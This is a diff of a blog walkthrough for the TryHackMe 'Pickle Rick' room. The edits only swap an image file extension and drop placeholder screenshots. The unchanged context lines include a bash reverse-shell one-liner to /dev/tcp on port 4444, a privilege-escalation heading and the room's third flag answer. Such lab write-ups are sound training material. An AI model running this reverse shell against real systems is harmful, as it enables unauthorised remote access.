@@ -2,7 +2,7 @@
 title: Pickle Rick
 categories: [TryHackMe]
 tags: [Linux, easy]
-image: images/Rick/Rick.png
+image: images/Rick/Rick.jpg
 ---
 
 **Pickle Rick** is an **easy** rated room on **TryHackMe** inspired by the *Rick and Morty* series. This walkthrough guides you through using a custom portal to find the three secret ingredients to reverse Rick's pickle transformation.
@@ -67,7 +67,7 @@ ls -la
 ```
 
 This reveals files like `Sup3rS3cretPickl3Ingred.txt`, `clue.txt`, etc.
-![Directory Listing](path/to/directory_listing.png)
+
 
 # 4. Gaining a Reverse Shell
 
@@ -86,7 +86,7 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
 Replace `10.10.10.10` with your IP. After execution, you should see a connection in your listener.
-![Reverse Shell Connection](path/to/reverse_shell.png)
+
 
 # 5. Privilege Escalation
 
@@ -123,7 +123,7 @@ less 3rd.txt
 ```
 
 The third ingredient is **fleebs_juice**.
-![Sudo Privilege Check](path/to/sudo_check.png)
+
 
 # 6. Capture the Ingredients
 
